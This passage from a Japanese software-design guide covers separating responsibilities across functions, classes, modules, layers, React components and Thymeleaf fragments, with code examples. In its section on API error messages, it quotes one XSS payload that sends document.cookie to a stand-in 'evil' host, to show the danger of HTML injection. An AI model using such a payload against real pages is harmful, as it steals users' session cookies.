  if (screen === 'list')    return `${date.getMonth() + 1}/${date.getDate()}`;
  // 画面が増えるたびにこの関数を触ることになる
}

// ✓ 「渡された書式で日付を整形する」だけ。呼び出し元が誰かは知らない
function formatDate(date: Date, pattern: string): string {
  return format(date, pattern);
}
// 画面側（呼び出し元）が、自分の都合を、関数の目線（この例の場合は日付形式）に合わせて呼び出す
formatDate(date, 'yyyy年M月'); // 請求画面
formatDate(date, 'M/d');       // 一覧画面
```

呼び出し元に忖度しないからこそ、この `formatDate` は特定の場面に縛られず、**レゴブロックのようにいろいろな場面で流用できる**。逆に画面種別に忖度した瞬間、その関数はその画面専用の部品になり、積み替えが利かなくなる。忖度しない部品を揃えておけば、あとはそれを組み合わせるだけで仕様が組み上がっていく。

### 4.4 クラスの責務 ── 一つの役割・一つの抽象度に揃える

関数を束ねた**クラス**にも責務がある。§2.1 の「このメソッドは何をするメソッドか」を、そのままクラスへ問う——**「このクラスは何をするクラスか」を一言で答えられるか。** 答えに「ときどき○○もして、△△もして」と混ざるなら、クラスの中でメソッドの**抽象度（altitude）がバラバラ**になっているサインだ。

例として、外部 API を呼ぶ `XxxxApiService` を考える。名前のとおり「Xxxx の API を呼ぶ」のが役割だ。ところが、メソッドごとにやっていることの"高さ"が揃っていない。

```ts
// ✗ 1つのクラスに、抽象度の違う3種類のメソッドが同居している
class XxxxApiService {
  // ① 素の API 呼び出し：リクエスト DTO を受け、レスポンス DTO をそのまま返す（本来の役割）
  fetchXxxx(req: XxxxRequest): Promise<XxxxResponse> {
    return this.http.post('/xxxx', req);
  }

  // ② 引数からリクエストを組み立てている＝「何を送るか」の業務判断が混ざる
  fetchXxxxByUser(userId: string, from: Date): Promise<XxxxResponse> {
    const req: XxxxRequest = { userId, since: from.toISOString(), limit: 100 }; // 組み立て
    return this.http.post('/xxxx', req);
  }

  // ③ レスポンスを別の DTO へ加工して返す＝「結果をどう解釈するか」が混ざる
  async fetchXxxxSummary(req: XxxxRequest): Promise<XxxxSummary> {
    const res = await this.http.post('/xxxx', req);
    return { total: res.items.length, latest: res.items[0]?.date }; // 変換
  }
}
```

呼び出す側は、このクラスのメソッドが「素通しなのか・入力を組み立ててくれるのか・出力を変換してくれるのか」を**メソッドごとに覚えないと使えない**。API を呼ぶだけのはずが、`fetchXxxxByUser` には「limit は 100」といった業務仕様が埋まり、`fetchXxxxSummary` にはレスポンスの解釈が埋まる。API クライアントなのに、呼び出し側の関心事（何を送るか・結果をどう使うか）まで抱え込んでいる。

`XxxxApiService` の責務は、**「リクエスト DTO を受け取り、レスポンス DTO（の `Promise`／`Mono`）を返す」ことに徹する**のが素直だ。リクエストの組み立ても、レスポンスの加工も、それを必要とする**呼び出し側（アプリケーション層）の仕事**——API クライアントの役割ではない（§4.6「下層は上層の都合を背負わない」の、クラス版）。

```ts
// ✓ ApiService は「リクエスト DTO → レスポンス DTO」だけ。全メソッドで抽象度が揃う
class XxxxApiService {
  fetchXxxx(req: XxxxRequest): Promise<XxxxResponse> {
    return this.http.post('/xxxx', req);
  }
  // メソッドが増えても、どれも「DTO を受けて DTO を返す」形で一貫する
}

// 組み立て・加工は、それを必要とする呼び出し側に置く
class XxxxService {
  constructor(private readonly api: XxxxApiService) {}

  async summaryForUser(userId: string, from: Date): Promise<XxxxSummary> {
    const req: XxxxRequest = { userId, since: from.toISOString(), limit: 100 }; // 組み立て（業務判断）
    const res = await this.api.fetchXxxx(req);                                   // 呼ぶだけ
    return { total: res.items.length, latest: res.items[0]?.date };             // 加工（解釈）
  }
}
```

こうすると、`XxxxApiService` を見た人は「ここは API を叩くだけの層だ」と一目で分かり、業務仕様やレスポンスの解釈を探しにいかずに済む。`XxxxService` 側も「リクエストを作り、API を呼び、結果を解釈する」という筋が一本に通る。

> **一貫していれば、別の役割を選んでもよい。** 大事なのは「加工が一切禁止」ではなく、**1つのクラスは1つの役割・1つの抽象度に揃える**こと。たとえば「API を隠してドメインオブジェクトを返す」窓口（リポジトリ／ゲートウェイ）として設計するなら、組み立ても変換もそのクラスの仕事になる——ただしその場合、素通しの DTO メソッドを混ぜてはいけない。`XxxxApiService` という名前は「API を呼ぶ薄い層」を宣言しているので、その役割からはみ出すメソッドが浮いて見える、という話だ。

### 4.5 モジュールの責務 ── 依存の向きは責務の上下で決める

クラスの外へ出て、**モジュール**同士の関係へ（ここではひとまず、あるサーバー／機能の内側で完結する単位を思い浮かべればよい）。責務の異なるモジュール同士は、**依存の向き**そのものにも責務がある。片方が「処理を使いたいだけ」でもう片方に依存すると、本来無関係なはずの2つが結合し、片方の都合がもう片方に染み出す。

- 例：一般ユーザー向けの会員登録（`SignupModule`）が、管理者向けのユーザー管理（`AdminUserModule`）を「ユーザー作成処理を流用したいから」と import するのは、依存の向きとして不健全。**管理者機能の都合が会員登録に影響してしまう**（管理者側を触ると会員登録が壊れうる）。
- 共通で使いたい処理があるなら、それを**さらに別のモジュールに切り出し**、双方がそれを import する。§5「資産化」を、関数だけでなく**モジュール間の依存関係にも適用する**。

```text
✗  SignupModule ──依存──▶ AdminUserModule（管理者機能）
    一般の会員登録が、管理者機能にぶら下がる。管理者側を触ると会員登録が壊れうる

✓  共通のユーザー処理を別モジュールに切り出し、両者が対等にそれへ依存する
    SignupModule ──▶ UserModule（ユーザーCRUD）◀── AdminUserModule
```

```ts
// ✗ admin-user.module.ts（管理者機能）— 管理画面向けの操作が雑多に生えている
export class AdminUserModule {
  createUser(input: CreateUserInput) {          // ユーザー作成（今はたまたま権限チェックなし）
    return db.users.insert(input);
  }
  banUser(userId: string) { /* アカウント凍結 */ }
  changeRole(userId: string, role: Role) { /* 権限変更 */ }
  deleteUser(userId: string) { /* 物理削除 */ }
  exportUsersCsv() { /* 管理画面用の一覧CSVを吐く */ }
}

// ✗ signup.module.ts（一般会員登録）が、createUser を使いたいだけで管理者機能に依存する
import { AdminUserModule } from './admin-user.module';

export class SignupModule {
  constructor(private readonly admin: AdminUserModule) {}
  signup(input: CreateUserInput) {
    return this.admin.createUser(input);        // 使いたいのは createUser ひとつだけ
  }
}
```

会員登録が欲しいのは `createUser` ひとつ。なのに `AdminUserModule` に依存したせいで、`banUser`・`deleteUser`・`exportUsersCsv` といった**管理者専用機能の塊にまるごとぶら下がる**。しかも借りている `createUser` は"管理者機能の中の一メソッド"なので、いつ管理者側の都合が入り込んでもおかしくない——たとえば後任が「管理者機能なんだから当然」と `createUser` に `assertIsAdmin(operatorId)` を足した瞬間、**無関係なはずの会員登録がコンパイルエラーや権限エラーで動かなくなる**。

```ts
// ✓ user.module.ts（ユーザーCRUD）— 誰の都合にも寄らない、素のユーザー操作だけ
export class UserModule {
  createUser(input: CreateUserInput) {
    return db.users.insert(input);
  }
}

// ✓ signup.module.ts — UserModule に依存し、会員登録の都合だけを足す
import { UserModule } from './user.module';

export class SignupModule {
  constructor(private readonly users: UserModule) {}
  signup(input: CreateUserInput) {
    return this.users.createUser(input);       // 素の作成を呼ぶだけ
  }
}

// ✓ admin-user.module.ts — 同じ UserModule に依存し、管理者の都合はこちらに閉じ込める
import { UserModule } from './user.module';

export class AdminUserModule {
  constructor(private readonly users: UserModule) {}
  createUser(input: CreateUserInput, operatorId: string) {
    assertIsAdmin(operatorId);                 // 権限チェックは管理者側だけの関心事
    return this.users.createUser(input);
  }
}
```

両者が対等に `UserModule` へ依存するので、**管理者側の権限チェックは `AdminUserModule` に閉じ、会員登録はそれを一切知らない**。管理者機能をどういじっても、会員登録は `UserModule` の素の `createUser` を呼ぶだけで影響を受けない。

「どちらがどちらに依存してよいか」は、**責務の上下・独立性**で決める。ついでの import で横につなぐと、疎結合が崩れる。

### 4.6 層の責務 ── 下層は「表示の都合」を背負わない

最後は最も大きな器、**層（レイヤ）**。原則はひとつ——**下層（計算・サービス・API）は「正しい値・正しい業務結果」を出すことに徹し、その値を"どう受け渡し・どう見せるか"という上層の都合は上層に委ねる**。この「下層は値だけに徹する」という1本の線は、器の大きさ違いで2段階に現れる。ただし上層に委ねる"都合"の中身は段階で異なる——① バックエンド内部では**画面へのデータ受け渡しと、どのビューを返すかの制御**、② バックとフロントの間では**整形・単位・マークアップという見せ方**。前者は「見せ方」そのものではないが、どちらも『下層は上層の都合を背負わない』で一貫している。小さいほう（①）から順に見ていく。

#### ① バックエンド内の層 ── サービスは「画面」を知らない

まずはバックエンド内部、**サービス層とコントローラ層**の境界。それぞれの責務はこう分かれている。

- **サービスの責務**：業務ロジック。データを取得・加工し、**正しい業務結果（値）を返す**。画面や HTTP のことは知らない。
- **コントローラの責務**：制御フローの受け渡し。リクエストを受けてサービスを呼び、①**画面に必要なデータを Model に受け渡し**、②**どのビューを返すか（またはどこへリダイレクトするか）を決める**。業務ロジックは持たない。
- **フレームワーク（View 層）の責務**：返されたビュー名からテンプレートを解決し、**Model のデータを差し込んで HTML を生成（レンダリング）する**。

では、この分担が崩れるとどうなるか。「注文一覧を取得して画面に渡す」という処理を題材に、**画面（Model）へのデータの受け渡し（`addModelAttribute`）はコントローラの仕事であって、サービスの仕事ではない**という一点に注目して、具体例（Spring Boot）で見てみよう。

```java
// ✗ サービスが Model を受け取り、画面の都合まで面倒を見ている（責務違反）
@Service
public class OrderService {
  public void loadOrders(Model model) {
    List<Order> orders = orderRepository.findAll();
    model.addAttribute("orders", orders); // ← 画面（Model）へのデータの受け渡しはサービスの仕事ではない
  }
}

// ✓ サービスは「注文を取得する」だけ。Model への橋渡しは Controller の責務
@Service
public class OrderService {
  public List<Order> findOrders() {
    return orderRepository.findAll();
  }
}

@Controller
public class OrderController {
  public String list(Model model) {
    model.addAttribute("orders", orderService.findOrders());
    return "orders";
  }
}
```

#### ② バックエンド ↔ フロントの層 ── バックは「値」、フロントが「見せ方」

境界がバックとフロントの間に移っても、話はまったく同じ。バックは正しい値を返すことに徹し、整形・単位・レイアウトはフロントが受け持つ。

**その1：金額の「計算」と「整形・単位」を分ける**
計算ロジック（や API）の責務は「正しい数値を出す」こと。カンマ区切りや「円」は表示の都合なので、フロント側の責務。

```ts
// ✗ 計算関数がカンマ区切り・「円」付けまでして"表示用の文字列"を返している
//   → 表示の都合が計算に染み込み、戻り値を数値として再利用できない
function calcPrice(order: Order): string {
  const price = applyDiscounts(order); // 割引適用済みの数値
  return `${price.toLocaleString('ja-JP')}円`; // "1,234円"
}
// → 合計を出したい・USD 表記にしたい、となっても "1,234円" は文字列なので計算し直せない。
//   表示ルール（カンマや単位）を変えたいだけでも計算関数を直す羽目になる
```

```ts
// ✓ 計算は「数値を返す」だけに徹する（表示の都合は持ち込まない）
function calcPrice(order: Order): number {
  return applyDiscounts(order); // 1234（生の値）
}
```

```tsx
// --- フロント（表示の責務）---
// カンマ区切り（整形）は関数に、「円」（単位）は HTML に置く
function formatWithComma(price: number): string {
  return price.toLocaleString('ja-JP');
}

<span className="price">{formatWithComma(order.price)}円</span>
```

計算が生の数値を返すからこそ、フロントは合計・別通貨・別表記へ自由に展開できる。API とフロントの境界でも同じで、**API は生の値を返し、整形・単位付けはフロントが行う**。

**その2：API は表示の都合（`<br>` など）を整形しない**
「どんな値か」「何が起きたか」を返すのがAPIの責務。改行やマークアップの見せ方はフロントの責務。
たとえば「項目AにエラーX・Y、項目BにエラーZ」というバリデーション結果を返す場合を考える。

```java
// ✗ API が <br> と全角スペースで"表示用の1枚テキスト"を組み立てて返している
//    → 表示レイアウト（改行位置・字下げ）が API のロジックに焼き込まれ、
//      どの項目がどのエラーか機械的に扱えない
StringBuilder message = new StringBuilder();
for (FieldError error : validationErrors) {
  message.append(error.field()).append(":<br>");        // 「項目A:」＋改行
  for (String detail : error.messages()) {
    message.append("　").append(detail).append("<br>"); // 全角スペースで字下げ＋改行
  }
}
return message.toString(); // "項目A:<br>　エラーX<br>　エラーY<br>項目B:<br>　エラーZ"
```

```tsx
// --- フロント（✗ の受け側）---
// API が <br> 入りの1枚テキストを返すので、改行を効かせるには HTML として描くしかない
<div dangerouslySetInnerHTML={{ __html: message }} />  // ≒ element.innerHTML = message
```

さらに悪いことに、この描き方は**XSS の穴**になる。エラーメッセージにユーザー入力由来の値（入力した商品名・コメントなど）が混ざるのはよくあること。もし `message` の中に `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` のような文字列が入り込むと、`<br>` を効かせるために HTML として描いているせいで、**その文字列がタグとして実行されてしまう**。API が「見せ方（`<br>`）」まで抱え込んだ結果、フロントは**エスケープの効かない描画（`dangerouslySetInnerHTML` / `innerHTML`）**へ追い込まれ、セキュリティ事故に直結する（§11）。

```java
// ✓ API は「どの項目に、どんなエラーがあるか」を構造化して返すだけ
record FieldErrors(String field, List<String> messages) {}

return List.of(
  new FieldErrors("A", List.of("エラーX", "エラーY")),
  new FieldErrors("B", List.of("エラーZ"))
);
```

```tsx
// --- フロント ---
// 受け取った構造から、改行・字下げ・強調といった"見せ方"はフロントが組み立てる
{errors.map(e => (
  <div key={e.field}>
    <strong>{e.field}</strong>
    <ul>{e.messages.map(m => <li key={m}>{m}</li>)}</ul>
  </div>
))}
```

構造化して返せば、フロントは項目ごとに `<ul>` で並べても、トースト1件にまとめても自由。しかも各値を `{m}` のように**テキストとして描ける**（React でも素の DOM でも、テキストノードは自動エスケープされる）ので、先ほどの XSS の穴もそもそも生まれない。逆に `<br>` 付きテキストで返すと、フロントは受け取った文字列をそのまま流し込むしかなく、**表示の主導権が API に奪われ**、ついでにエスケープの逃げ場も失う。

### 4.7 継承より委譲 ── 「is-a」でなければ継承しない

コードを共有したくて安易に `extends`（継承）で親からもらうと、**親の都合が子に丸ごと流れ込む**。子は使わないメソッドまで引き継ぎ、親を変えれば全ての子が影響を受ける——§4.5「依存の向き」が崩れた状態が、継承では特に強固に固定される。

継承が正当なのは、子が親の**本当の一種（is-a）**で、親のふるまいを**そのまま全部**引き受けてよいときだけ。「処理を使い回したいだけ」なら、継承ではなく**委譲（has-a：必要な部品を持って呼ぶ）**にする。

厄介なのは、**継承が"うまくハマって見える"ケース**だ。例として、**先着順に貯めて先頭から処理する待ち行列**（`TaskQueue`）を作る。また、このqueueでは、同じ ID のタスクは二重投入させたくない（重複拒否）。一方、チームには汎用の順序付きリスト基盤 `ItemList` がすでにある。

```ts
// チーム共通の汎用リスト：貯める・差し込む・抜く・並べ替える…を一通り備える
class ItemList<T> {
  protected items: T[] = [];
  add(item: T): void { this.items.push(item); }
  at(i: number): T { return this.items[i]; }
  insertAt(i: number, item: T): void { this.items.splice(i, 0, item); }
  removeAt(i: number): void { this.items.splice(i, 1); }
  sort(compare: (a: T, b: T) => number): void { this.items.sort(compare); }
  get size(): number { return this.items.length; }
}
```

```ts
// ✗ 「配列の管理（追加・取り出し・サイズ）を丸ごと再利用でき、重複チェックしたい add だけ差し替えれば済む」に見える
class TaskQueue extends ItemList<Task> {
  add(task: Task): void {
    if (this.items.some(t => t.id === task.id)) return; // 重複拒否
    super.add(task);
  }
  next(): Task | undefined {
    const head = this.items[0];
    if (head) this.removeAt(0);   // 先頭（＝最先着）を処理
    return head;
  }
}
```

一見、これで「重複なし・先着順」の待ち行列が手に入ったように見える。**ここが罠**。`TaskQueue` は `ItemList` を継承した＝**IS-A ItemList** なので、`add` を塞いでも、**親の他の入口が全部開いたまま外に露出している**。

```ts
const queue = new TaskQueue();
// どれも「重複拒否」「先着順」を通らずに、待ち行列の約束を破れてしまう
queue.insertAt(0, alreadyQueuedTask);          // add を経由しないので重複がすり抜け、先頭に割り込み（FIFO崩壊）
queue.sort((a, b) => a.priority - b.priority); // 到着順そのものを並べ替えて消す
queue.removeAt(3);                             // 真ん中から勝手に抜く
```

守りたい不変条件（**重複なし・先着順**）を `add` 一箇所で守ったつもりでも、`insertAt`・`sort`・`removeAt` という別の口から破られる。塞ぐには継承した**全メソッドを override** する羽目になり、しかも `ItemList` に新メソッドが1つ増えるたび穴が黙って復活する（＝壊れやすい基底クラス）。「一種として親を丸ごと引き受けてよい（is-a）」が成り立っていないのに継承した、そのツケだ。

```ts
// ✓ 待ち行列は ItemList の"一種"ではなく、内部で ItemList を"持って使う"だけ（委譲）。
//    外に見せる口は enqueue / dequeue / size に絞る
class TaskQueue {
  private readonly items = new ItemList<Task>(); // has-a：継承せず、部品として保持する
  private readonly seenIds = new Set<string>();

  enqueue(task: Task): void {
    if (this.seenIds.has(task.id)) return; // 重複拒否
    this.seenIds.add(task.id);
    this.items.add(task);                  // 末尾に積む＝先着順（ItemList.add に委譲）
  }
  dequeue(): Task | undefined {            // 取り出しは常に先頭から＝先着順
    if (this.items.size === 0) return undefined;
    const head = this.items.at(0);         // 先頭＝最先着
    this.items.removeAt(0);                // その先頭だけを抜く
    this.seenIds.delete(head.id);
    return head;
  }
  get size(): number { return this.items.size; }
}
```

同じ `ItemList` を、今度は**継承せず内部に持って必要なメソッドだけ呼ぶ（委譲）**。`ItemList` の危険な `insertAt` や `sort` は**内部に隠れ、`TaskQueue` の公開面には出てこない**。外から呼べるのは `enqueue`／`dequeue`／`size` だけなので、割り込みも並べ替えも起こりようがなく、あらゆる変更が `enqueue`/`dequeue` を通る＝不変条件が破れない。重複判定用の `Set` も内部に隠せる。**これが継承との決定的な差**：継承は親の全メソッドを自動で外へ晒すが、委譲は**どれを見せるかを子が選べる**。

判断はいつも「**子は親の一種か（TaskQueue は ItemList か）？**」。ここで No——待ち行列は「リストの一種」ではなく「リストを使って実現するもの」——なのが決定的な分かれ目だ。狭い窓口だけを公開して不変条件を守るこの形は、§4.3「お役所仕事＝狭い窓口」をクラスの公開面でも作るということ。共有したい処理があるなら、§5 のように別部品へ切り出して**両者が委譲で使う**のが基本形。

### 4.8 コンポーネントの責務（React／画面）

§4 の「1単位1役割」は、画面のコンポーネントにもそのまま当てはまる。1つのコンポーネントに**データ取得・業務判断・表示**を全部詰めると、器が肥大化して再利用も効かない。

```tsx
// ✗ 取得・業務判断・整形・表示が1つのコンポーネントに同居している
function OrderPanel({ orderId }: { orderId: string }) {
  const [order, setOrder] = useState<Order>();
  useEffect(() => {
    fetch(`/api/orders/${orderId}`).then(r => r.json()).then(setOrder); 
  }, [orderId]);
  if (!order) return null;
  const canCancel = order.status === 'pending' && !order.isShipped;   // 業務ルールが画面に埋まる
  return (
    <div>
      <span>{order.price.toLocaleString('ja-JP')}円</span>            {/* 整形も直書き */}
      {canCancel && <button>キャンセル</button>}
    </div>
  );
}
```

```tsx
// ✓ 役割で分ける：取得はフック、業務ルールは共有関数(§5)、表示は素直な部品
function OrderPanel({ orderId }: { orderId: string }) {
  const order = useOrder(orderId);      // 取得の責務はフックへ
  if (!order) return null;
  return <OrderView order={order} />;   // この階層は「取得と表示を繋ぐ」だけ
}

function OrderView({ order }: { order: Order }) {
  return (
    <div>
      <Money amount={order.price} />                          {/* 表示は資産化した部品(§5) */}
      {canCancelOrder(order) && <button>キャンセル</button>}   {/* 業務ルールは共有関数(§5) */}
    </div>
  );
}
```

**表示専用のコンポーネントは、渡された props を素直に描くだけ**（§4.3「お役所仕事」の画面版）。取得や業務判断を持ち込まないから、どの画面にも置け、テストも props を渡すだけで済む。

**カスタムフック ── 状態・副作用を伴うロジックの切り出し先**
上の `useOrder` の中身がカスタムフック。§2 の関数分割・§5 の資産化は「状態を持たない計算」を切り出すものだったが、`useState`・`useEffect` のような**Reactの状態・副作用が絡むロジック**は普通の関数には移せない。その受け皿がカスタムフックであり、**「取得と状態管理」という振る舞いだけを、JSX から切り離して1箇所に閉じ込める**。

```tsx
// カスタムフック：✗ の OrderPanel にあった useState + useEffect（取得と状態管理）を、そのまま抜き出しただけ
function useOrder(orderId: string): Order | undefined {
  const [order, setOrder] = useState<Order>();
  useEffect(() => {
    fetch(`/api/orders/${orderId}`).then(r => r.json()).then(setOrder);
  }, [orderId]);
  return order; // 見た目(JSX)は持たず、「取得した状態」だけを返す
}
```

- カスタムフックは**JSX を持たない＝「見た目」ではなく「振る舞い」の部品**。だから複数のコンポーネントで使い回せる（§5「資産化」のフック版）。
- コンポーネント側からは `fetch` も `useState` も消え、`const order = useOrder(orderId)` の1行になる。**画面は「フックで状態を得て、部品に渡す」だけ**に戻る。
- フック単体でも「取得の振る舞い」だけをテストでき、`OrderView` は状態を知らないまま props だけでテストできる。

**分割の結果、責務が一対一に整理される**
ここまでで、肥大化していた `OrderPanel` は次の独立した部品に割れた。**それぞれが一言で説明でき（§2.1）、変更理由もバラバラ**になる。

| 部品 | 責務（一言） | ここだけ直せばよい変更 |
|---|---|---|
| `useOrder` | 取得と状態管理 | 取得先が REST → GraphQL に変わった |
| `canCancelOrder`（§5） | 業務ルール（キャンセル可否） | 「発送済みは不可」の条件が変わった |
| `Money`（§5） | 金額の表示（整形・単位） | 「円」を「¥」にしたい |
| `OrderView` | レイアウト（何をどこに並べるか） | ボタンの位置を変えたい |
| `OrderPanel` | 上記を繋ぐ結線だけ | ― |

これは §2.2 の CSV 取り込みで見た「**どこを直せば何が変わるかが、概念の単位で一対一に決まる**」の画面版。分割はバラバラにすることが目的ではなく、**分けた結果として一つひとつの責務がくっきり整い、変更が他へ波及しなくなる**ことに意味がある。

**MPA でも「React だったら」を考えて HTML を作る**
サーバサイドテンプレート（Thymeleaf など）で素の HTML を書くときも、**「これを React で書くならどうコンポーネントに割るか」を先に頭の中で考える**と、自然と良い構造になる。「ここは `<OrderView>`、この繰り返しは1つの部品」と分割してからマークアップすれば、意味のまとまりごとにブロック化され、重複も概念単位で括り出せる。フレームワークが React でなくても、**"コンポーネントで考える"という設計の視点は移植できる**。

**部分テンプレートは"引数（props）"だけに依存する**
分割したブロックを Thymeleaf のフラグメント（`th:fragment`）に切り出すとき、**Reactの表示専用コンポーネントが props だけに依存するのと同じ規律**を守る——**フラグメントは受け取った引数だけに依存し、controller が `model.addAttribute(...)` したグローバルな属性を中で直接掴まない**。model 属性はテンプレート全体から見える"アンビエントな変数"で、そこへ手を伸ばすのは、部品がグローバルスコープに依存している状態（＝ props ではなく外の文脈に依存）だ。

```html
<!-- ✗ fragments/order.html : 引数を取らず、controller の addAttribute("order") に直接依存 -->
<div th:fragment="orderCard">
  <span th:text="|${#numbers.formatInteger(order.price,0,'COMMA')}円|"></span>
  <!-- 業務ルール（キャンセル可否）がテンプレートに埋まっている -->
  <button th:if="${order.status == 'PENDING' and !order.shipped}">キャンセル</button>
</div>

<!-- 呼び出し側：このフラグメントが ${order} を要ることが見えない（暗黙依存） -->
<div th:replace="~{fragments/order :: orderCard}"></div>
```

```html
<!-- ✓ fragments/order.html : 引数(order, canCancel)だけに依存。model の属性名は知らない -->
<div th:fragment="orderCard(order, canCancel)">
  <span th:text="|${#numbers.formatInteger(order.price,0,'COMMA')}円|"></span>   <!-- 整形はテンプレの責務 -->
  <button th:if="${canCancel}">キャンセル</button>                              <!-- 判断は受け取るだけ -->
</div>

<!-- 呼び出し側が、必要な値を明示的に渡す（依存がシグネチャに出る） -->
<div th:replace="~{fragments/order :: orderCard(${order}, ${canCancelOrder})}"></div>
```

引数で受けると、`${order}` という**属性名への暗黙依存が消える**。すると (1) 一覧の繰り返しで `orderCard(${item})`、別ページで別の式、と**属性名に縛られず流用でき**、(2) 何が要るかが `:: orderCard(...)` に**明示される**（§4.3「お役所仕事＝狭い窓口」の画面版）。逆に `${order}` 直掴みは、controller が属性名を変えた瞬間に**サイレントに null 評価して崩れる**。

同じ画面部品なので、§4.6 の「値と見せ方」の線もそのまま効く。

- **業務判断はテンプレートに埋めない。** `status == 'PENDING' and !shipped` のようなキャンセル可否は**業務ルール**なので、サービスで決めて controller が `canCancel` フラグとして渡す（§4.6①「サービスが業務結果、テンプレは表示」）。テンプレの `th:if` は"見せ方の分岐"（空ならバッジを出さない等）に留める。**フラグや導出が複雑になったら、controller/サービスが画面用のビューモデルを組み、判断を"解決済み"の状態で渡す**のが正攻法だ。ヘルパーは**表示ロジックの再利用**（ラベル整形など）には使ってよいが、**業務ルールをヘルパー化してテンプレートから呼ぶ**形は避ける——判断がレンダー時にテンプレ側で起きてしまい、この分離が崩れる。
- **整形・単位・レイアウトは逆にテンプレートの責務。** 生値（`order.price` は数値）を受けて `#numbers` で整える。整形が複雑・複数テンプレで統一したいなら、**表示層のビューモデルが `priceLabel: "1,234円"` を持つのはあり**——ビューモデルは表示側の部品なので整形はその責務の内だ。やってはいけないのは、**業務の真実を返す層（ドメインサービス／API の DTO）が `"1,234円"` を返す**こと。禁じているのはそちらで、そこは生値のまま（§4.6②の裏返し）。判定軸は「ビューモデルか否か」ではなく、**そのビューモデルが表示層か業務層か**。
- **部分テンプレートの引数は必要最小限だけ渡す。** `${session}`・`${#request}`・`${#authentication}` のような**アンビエントなグローバルにフラグメント内から手を伸ばさない**——それも「props 以外への依存」で、model 直掴みと同じ穴だ。必要な認証情報などは引数で明示的に渡す。

---

## 5. 再利用と資産化（装備を充実させる）

> 責務がきれいに分かれた概念は、切り出して**使い回せる**。溜めるほど、開発は楽になっていく。ただし括る粒度を誤ると逆効果になる——**溜める（§5.1）**、その歯止めの**括りすぎない（§5.2）**、そして溜めた資産の**劣化を押し戻す（§5.3）**、の三つで「開発が進むほど楽になる」状態を保つ。

### 5.1 資産化する ── 汎用的な概念を切り出して溜める

汎用的な概念を処理から切り出して**コンポーネント化**し、再利用可能なプログラムをリポジトリ内にどんどん溜めていく。

- 追加開発のたびに、溜めてきた資産を使い回す。
- 開発が進むほど効率的に開発できる状態を目指す。
  （ゲームをやり込むほどアイテムや装備が充実し、攻略が楽になるイメージ。）

**例1：サーバーサイド — よく使う業務ルールを切り出して資産にする**

「この注文はキャンセルできるか？」のような**業務ルールの判定**は、あちこちで必要になる。各所で書くと条件が少しずつ食い違い、デグレの温床になる。

```ts
// ✗ 「注文をキャンセルできるか」の判定を、画面・サービスごとに各自書いている
// 注文一覧
const showCancelButton = order.status === 'pending';
// 注文詳細
const canCancel = order.status === 'pending' && !order.isShipped;
// 管理画面
const cancelable = ['pending', 'confirmed'].includes(order.status);
// → 判定条件がバラバラ。「発送済みは不可」という仕様変更が入っても、直し漏れた画面だけ古いまま残る

// ✓ 「キャンセル可能か」という業務ルールを 1 箇所に切り出して資産化
export function canCancelOrder(order: Order): boolean {
  return order.status === 'pending' && !order.isShipped;
}

// 以降、どの画面・どのサービスも同じ判定を呼ぶだけ。仕様変更もここだけ直せば全体に効く
const showCancelButton = canCancelOrder(order);
const canCancel = canCancelOrder(order);
const cancelable = canCancelOrder(order);
```

こうした「◯◯できるか」「◯◯に該当するか」といった判定（例：会員ランクの判定、送料無料の判定、期間限定商品かどうかの判定）は、**業務ルールそのもの**なので、条件式を裸で散らばらせず、必ず名前の付いた関数に閉じ込めて共有する。

**例2：フロントエンド — 表示部品を切り出して資産にする（React）**

```tsx
// ✗ 金額表示のたびに、各画面で整形＆マークアップを手書き。しかも通貨や桁数がバラバラに散らばる
<span className="price">{price.toLocaleString('ja-JP')}円</span>                          // 商品一覧（日本円）
<span className="price">{total.toLocaleString('ja-JP')}円</span>                          // カート（日本円）
<span className="price">{fee.toLocaleString('ja-JP', { minimumFractionDigits: 2 })}円</span> // 手数料（小数2桁）
<span className="price">{usdPrice.toLocaleString('en-US')} USD</span>                     // 海外価格（USD）
<span className="price">{eurPrice.toLocaleString('de-DE')} EUR</span>                     // 海外価格（EUR）
// → 「円」を「¥」に変えたい、桁区切りのルールを直したい、となったら全箇所を探して直すことになる

// ✓ 「金額を表示する」概念を 1 つのコンポーネントに切り出して資産化
//   ロケール・整形オプション・単位は props で受け取り、既定は日本円にしておく
type MoneyProps = {
  amount: number;
  locale?: string;                        // 例: 'ja-JP' / 'en-US'
  options?: Intl.NumberFormatOptions;     // toLocaleString の第2引数（小数桁など）
  unit?: string;                          // 表示する通貨単位
};

export function Money({ amount, locale = 'ja-JP', options, unit = '円' }: MoneyProps) {
  return <span className="price">{amount.toLocaleString(locale, options)}{unit}</span>;
}

// 以降、どの画面も同じ部品を並べるだけ（既定は日本円）
<Money amount={price} />                                          // 1,234円
<Money amount={total} />                                          // 1,234円

// 必要な画面だけ、ロケール・整形・単位を上書きできる
<Money amount={fee} options={{ minimumFractionDigits: 2 }} />     // 1,234.00円
<Money amount={usdPrice} locale="en-US" unit=" USD" />           // 1,234 USD
```

### 5.2 抽象化しすぎない ── 「似ている」と「同じ概念」は違う

§2・§5 は抽象化・資産化を強く勧めてきた。だが**逆向きの失敗**もある。まだ概念が固まらないうちに共通化したり、**たまたまコードが似ているだけの別概念を1つにまとめる**と、後から「片方だけ挙動を変えたい」となるたびに分岐やフラグが増え、かえって複雑になる。抽象化にも §1.1 の YAGNI が効く——**必要になるまで抽象化しない**。

**似ているだけで、実は違う概念**
危ないのは「今コードが同じ」を根拠に共通化してしまうこと。判断すべきは**コードの見た目ではなく、概念として同じか＝将来"同じ理由で"一緒に変わるか**。

```ts
// 送料無料もポイント2倍も、今はどちらも「5000円以上」。
// ✗ つい「"優待ライン"という共通概念だ」と思い、1つの判定に括ってしまう（名前まで付いて満足しがち）
const PREMIUM_LINE = 5000;
function isEligibleForPerk(order: Order): boolean {  // 送料無料にも、ポイント2倍にも、これを使う
  return order.total >= PREMIUM_LINE;
}
```

